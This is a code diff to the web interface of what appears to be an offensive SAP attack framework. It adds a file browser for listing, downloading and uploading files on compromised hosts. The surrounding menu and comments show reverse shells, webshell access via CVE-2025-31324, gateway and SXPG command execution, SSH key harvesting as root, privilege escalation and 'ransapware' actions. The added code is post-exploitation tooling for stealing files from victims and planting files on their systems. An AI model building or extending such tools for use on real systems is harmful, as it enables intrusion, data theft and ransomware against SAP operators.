@@ -1254,6 +1254,7 @@ body {
       <div class="ctx-item" data-action="create_user_creds">&#128100; Create User (Credentials)</div>
       <div class="ctx-item" data-action="create_tcpip">&#128279; Create TCP/IP Dest (sapxpg)</div>
       <div class="ctx-item" data-action="os_terminal">&#128187; OS Command Terminal</div>
+      <div class="ctx-item" data-action="file_browser">&#128193; File Browser (upload / download)</div>
       <div class="ctx-item" data-action="reverse_shell">&#128279; Reverse Shell</div>
       <div class="ctx-item" data-action="import_transport">&#128230; Import Local Transport (zip)</div>
       <div class="ctx-item" data-action="tms_propagate" style="color:#f0883e">&#127919; Propagate Transport across TMS Domain</div>
@@ -2506,6 +2507,51 @@ body {
     </div>
     </div>
     <div class="shell-resize-handle" id="term-resize-handle"></div>
+  </div>
+</div>
+
+<!-- File Browser Modal -->
+<div class="modal-overlay" id="fb-modal">
+  <div class="modal shell-window" id="fb-window" style="width:900px;height:600px">
+    <div class="shell-titlebar" id="fb-titlebar">
+      <h3 style="margin:0">&#128193; File Browser &mdash; <span id="fb-sid"></span></h3>
+    </div>
+    <div style="flex:1;overflow:hidden;padding:12px;display:flex;flex-direction:column">
+      <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px;flex-shrink:0">
+        <button class="btn" onclick="fbNavigate('..')" title="Go up one level" style="padding:4px 10px;font-size:16px">&#11014;</button>
+        <input type="text" id="fb-path" value="/tmp" style="flex:1;font-family:monospace;font-size:13px"
+               onkeydown="if(event.key==='Enter'){event.preventDefault();fbNavigate(this.value);}">
+        <button class="btn btn-primary" onclick="fbNavigate(document.getElementById('fb-path').value)" style="white-space:nowrap">Go</button>
+        <button class="btn" onclick="fbRefresh()" title="Refresh">&#8635;</button>
+      </div>
+      <div id="fb-status" style="font-size:11px;color:#8b949e;margin-bottom:6px;flex-shrink:0"></div>
+      <div style="overflow-y:auto;flex:1 1 0;border:1px solid #30363d;border-radius:4px;
+                  user-select:text;-webkit-user-select:text;cursor:default;
+                  scrollbar-width:auto;scrollbar-color:#484f58 #161b22">
+        <table style="width:100%;border-collapse:collapse;font-size:12px;font-family:monospace">
+          <thead style="position:sticky;top:0;background:#161b22;z-index:1">
+            <tr style="color:#8b949e;border-bottom:1px solid #30363d">
+              <th style="text-align:left;padding:6px 8px;width:40px"></th>
+              <th style="text-align:left;padding:6px 8px">Name</th>
+              <th style="text-align:right;padding:6px 8px;width:90px">Size</th>
+              <th style="text-align:left;padding:6px 8px;width:110px">Mode</th>
+              <th style="text-align:left;padding:6px 8px;width:180px">Modified</th>
+              <th style="text-align:center;padding:6px 8px;width:60px"></th>
+            </tr>
+          </thead>
+          <tbody id="fb-tbody"></tbody>
+        </table>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;margin-top:8px;flex-shrink:0">
+        <label class="btn" style="cursor:pointer;margin:0" title="Upload a file to the current directory">
+          &#11014; Upload
+          <input type="file" id="fb-upload-input" style="display:none" onchange="fbUploadFile()">
+        </label>
+        <span id="fb-upload-status" style="font-size:11px;color:#8b949e;flex:1"></span>
+        <button class="btn" onclick="closeModal('fb-modal')">Close</button>
+      </div>
+    </div>
+    <div class="shell-resize-handle" id="fb-resize-handle"></div>
   </div>
 </div>
 
@@ -6032,6 +6078,7 @@ function showCtxMenu(e, sid) {
     //   - ABAP SXPG: requires an ABAP dialog/RFC user with SAP_ALL.
     //   - CVE-2025-31324 webshell: Java only, unauth.
     'os_terminal':      hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
+    'file_browser':     hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
     'reverse_shell':    hasGwVuln || (isAbapStack && hasCreatedUsers) || hasCve31324 || hasSshAccess || hasSapControlOsExec,
     'ssh_harvest':      !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers),
     'ssh_harvest_root': !isWindows && (hasGwVuln || hasCve31324 || hasCreatedUsers)
@@ -6296,6 +6343,7 @@ function showCtxMenu(e, sid) {
         ? 'RECON admin user exists but no JSP-deploy primitive is reachable (CTC ConfigServlet removed, admin telnet firewalled). System is hardened — data extraction not available from here.'
         : 'Requires Java/dual-stack + CVE-2025-31324, GW SAPXPG, or a Java admin user with a reachable CTC / telnet endpoint'),
     'os_terminal':      'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), CVE-2025-31324 webshell (Java), SSH lateral movement, or SAPControl OSExecute from a verified Type-G destination',
+    'file_browser':     'Requires an OS-exec path: vulnerable GW, ABAP+created-user, CVE-2025-31324 webshell, SSH lateral, or SAPControl OSExecute',
     'reverse_shell':    'Requires an OS-exec path: vulnerable GW (any stack), ABAP+created-user (SXPG), or CVE-2025-31324 webshell (Java)',
     'ssh_harvest':      'Requires OS-exec on a Linux host — reads /etc/passwd + .ssh dirs via GW SAPXPG, CVE-2025-31324, or SXPG_STEP_XPG_START',
     'ssh_harvest_root': 'Requires a viable Linux LPE (Copy Fail / pedit-COW / Dirty Frag) — run "Escalate to Root" first. Reads ALL users\' .ssh directories as root.',
@@ -8734,6 +8782,7 @@ async function ctxAction(action) {
     case 'ransapware_decrypt':
       showRansapwareDecryptModal(sid); break;
     case 'os_terminal': showTerminalModal(sid); break;
+    case 'file_browser': showFileBrowserModal(sid); break;
     case 'reverse_shell': showShellModal(sid); break;
     case 'import_transport': showImportTransportModal(sid); break;
     case 'tms_propagate':    showTMSPropagateModal(sid); break;
@@ -14595,6 +14644,145 @@ async function termExec() {
   document.getElementById('term-cmdline').focus();
 }
 
+// --- File Browser ---
+let _fbSid = '';
+let _fbCurrentPath = '/tmp';
+
+function showFileBrowserModal(sid) {
+  _fbSid = sid;
+  _fbCurrentPath = '/tmp';
+  document.getElementById('fb-sid').textContent = sid;
+  document.getElementById('fb-path').value = _fbCurrentPath;
+  document.getElementById('fb-status').textContent = '';
+  document.getElementById('fb-tbody').innerHTML = '';
+  document.getElementById('fb-upload-status').textContent = '';
+  const win = document.getElementById('fb-window');
+  win.style.top = '50%'; win.style.left = '50%';
+  win.style.transform = 'translate(-50%, -50%)';
+  win.style.width = '900px'; win.style.height = '600px';
+  document.getElementById('fb-modal').classList.add('visible');
+  fbNavigate(_fbCurrentPath);
+}
+
+function _fbFormatSize(bytes) {
+  if (bytes === 0) return '0 B';
+  if (bytes < 1024) return bytes + ' B';
+  if (bytes < 1024*1024) return (bytes/1024).toFixed(1) + ' KB';
+  if (bytes < 1024*1024*1024) return (bytes/(1024*1024)).toFixed(1) + ' MB';
+  return (bytes/(1024*1024*1024)).toFixed(2) + ' GB';
+}
+
+async function fbNavigate(path) {
+  if (path === '..') {
+    const parts = _fbCurrentPath.replace(/\/+$/, '').split('/');
+    parts.pop();
+    path = parts.join('/') || '/';
+  }
+  path = path.replace(/\/+$/, '') || '/';
+  _fbCurrentPath = path;
+  document.getElementById('fb-path').value = path;
+  document.getElementById('fb-status').textContent = 'Loading...';
+  document.getElementById('fb-tbody').innerHTML = '';
+  try {
+    const res = await api('POST', `node/${_fbSid}/fs/list`, { path });
+    if (!res.ok) {
+      document.getElementById('fb-status').textContent = 'Error: ' + (res.error || 'unknown');
+      return;
+    }
+    const entries = res.entries || [];
+    document.getElementById('fb-status').textContent =
+      path + ' — ' + entries.length + ' entries';
+    const tbody = document.getElementById('fb-tbody');
+    tbody.innerHTML = '';
+    const dirs = entries.filter(e => e.is_dir).sort((a,b) => a.name.localeCompare(b.name));
+    const files = entries.filter(e => !e.is_dir).sort((a,b) => a.name.localeCompare(b.name));
+    for (const e of [...dirs, ...files]) {
+      const tr = document.createElement('tr');
+      tr.style.cssText = 'border-bottom:1px solid #21262d;cursor:pointer';
+      tr.onmouseover = function(){ this.style.background='#161b22'; };
+      tr.onmouseout = function(){ this.style.background=''; };
+      const icon = e.is_dir ? '📁' : '📄';
+      const fullPath = (path === '/' ? '/' : path + '/') + e.name;
+      if (e.is_dir) {
+        tr.ondblclick = function(){ fbNavigate(fullPath); };
+      }
+      tr.innerHTML =
+        '<td style="padding:4px 8px;text-align:center">' + icon + '</td>' +
+        '<td style="padding:4px 8px;color:' + (e.is_dir ? '#58a6ff' : '#c9d1d9') + '">' +
+          _esc(e.name) + '</td>' +
+        '<td style="padding:4px 8px;text-align:right;color:#8b949e">' +
+          (e.is_dir ? '' : _fbFormatSize(e.size)) + '</td>' +
+        '<td style="padding:4px 8px;color:#8b949e">' + _esc(e.mode || '') + '</td>' +
+        '<td style="padding:4px 8px;color:#8b949e">' + _esc(e.mtime || '') + '</td>' +
+        '<td style="padding:4px 8px;text-align:center">' +
+          (e.is_dir ? '' :
+            '<button class="btn" style="padding:2px 8px;font-size:11px" ' +
+            'onclick="event.stopPropagation();fbDownload(\'' + _esc(fullPath).replace(/'/g, "\\'") + '\')">' +
+            '⬇</button>') +
+        '</td>';
+      tbody.appendChild(tr);
+    }
+    if (entries.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="6" style="padding:12px;color:#8b949e;text-align:center">' +
+        '(empty directory)</td></tr>';
+    }
+  } catch (e) {
+    document.getElementById('fb-status').textContent = 'Error: ' + e;
+  }
+}
+
+function fbRefresh() {
+  fbNavigate(_fbCurrentPath);
+}
+
+async function fbDownload(remotePath) {
+  document.getElementById('fb-status').textContent = 'Downloading ' + remotePath + '...';
+  try {
+    await api('POST', `node/${_fbSid}/fs/download`, { path: remotePath });
+    document.getElementById('fb-status').textContent =
+      'Download started for ' + remotePath + ' — check console for progress';
+    showToast('Download started: ' + remotePath, 'info');
+  } catch (e) {
+    document.getElementById('fb-status').textContent = 'Download error: ' + e;
+  }
+}
+
+async function fbUploadFile() {
+  const input = document.getElementById('fb-upload-input');
+  if (!input.files || !input.files[0]) return;
+  const file = input.files[0];
+  const remotePath = (_fbCurrentPath === '/' ? '/' : _fbCurrentPath + '/') + file.name;
+  document.getElementById('fb-upload-status').textContent =
+    'Uploading ' + file.name + ' (' + _fbFormatSize(file.size) + ')...';
+  const formData = new FormData();
+  formData.append('file', file);
+  formData.append('remote_path', remotePath);
+  try {
+    const resp = await fetch('/api/node/' + _fbSid + '/fs/upload', {
+      method: 'POST',
+      body: formData
+    });
+    const res = await resp.json();
+    if (res.status === 'started') {
+      document.getElementById('fb-upload-status').textContent =
+        'Upload started: ' + file.name + ' → ' + remotePath;
+      showToast('Upload started: ' + file.name, 'info');
+    } else {
+      document.getElementById('fb-upload-status').textContent =
+        'Upload error: ' + (res.error || 'unknown');
+    }
+  } catch (e) {
+    document.getElementById('fb-upload-status').textContent = 'Upload error: ' + e;
+  }
+  input.value = '';
+}
+
+function _esc(s) {
+  const d = document.createElement('div');
+  d.textContent = s;
+  return d.innerHTML;
+}
+
 // --- Reverse Shell ---
 let _shellPollId = null;
 let _shellSid = '';
@@ -15794,6 +15982,7 @@ function makeDraggableResizable(winId, barId, handleId) {
 makeDraggableResizable('shell-window', 'shell-titlebar', 'shell-resize-handle');
 makeDraggableResizable('jss-window', 'jss-titlebar', 'jss-resize-handle');
 makeDraggableResizable('term-window', 'term-titlebar', 'term-resize-handle');
+makeDraggableResizable('fb-window', 'fb-titlebar', 'fb-resize-handle');
 
 // --- Global actions ---
 async function propagateAll() {
